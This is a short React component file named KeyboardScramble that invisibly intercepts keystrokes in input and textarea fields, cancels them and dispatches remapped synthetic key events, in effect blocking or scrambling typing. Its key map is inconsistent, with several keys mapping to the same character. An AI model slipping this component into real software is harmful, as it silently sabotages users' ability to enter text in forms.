import { useEffect } from 'react';

const keyMap = {
  'a': 's', 'b': 'd', 'c': 'f', 'd': 'g', 'e': 'h', 'f': 'j', 'g': 'k', 'h': 'l', 'i': ';', 'j': 'a', 'k': 'b', 'l': 'c', 'm': 'v', 'n': 'b', 'o': 'n', 'p': 'm', 'q': 'w', 'r': 'e', 's': 'r', 't': 't', 'u': 'y', 'v': 'u', 'w': 'i', 'x': 'o', 'y': 'p', 'z': 'x',
  'A': 'S', 'B': 'D', 'C': 'F', 'D': 'G', 'E': 'H', 'F': 'J', 'G': 'K', 'H': 'L', 'I': ';', 'J': 'A', 'K': 'B', 'L': 'C', 'M': 'V', 'N': 'B', 'O': 'N', 'P': 'M', 'Q': 'W', 'R': 'E', 'S': 'R', 'T': 'T', 'U': 'Y', 'V': 'U', 'W': 'I', 'X': 'O', 'Y': 'P', 'Z': 'X',
  '1': '2', '2': '3', '3': '4', '4': '5', '5': '6', '6': '7', '7': '8', '8': '9', '9': '0', '0': '-', '-': '=', '=': '+',
  ';': 'q', '/': '.', '.': ',', ',': 'z', '[': ']', ']': '[', '\\': '\\',
};

function KeyboardScramble() {
  useEffect(() => {
    const handleKeyDown = (event) => {
      if (document.activeElement && (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'TEXTAREA')) {
        if (event.key in keyMap) {
          event.stopPropagation();
          event.preventDefault();
          const newEvent = new KeyboardEvent('keypress', {
            key: keyMap[event.key],
            code: event.code,
            charCode: event.charCode,
            ctrlKey: event.ctrlKey,
            shiftKey: event.shiftKey,
            altKey: event.altKey,
            metaKey: event.metaKey,
          });
          document.activeElement.dispatchEvent(newEvent);
        }
      }
    };

    window.addEventListener('keydown', handleKeyDown);

    return () => {
      window.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  return null;
}

export default KeyboardScramble;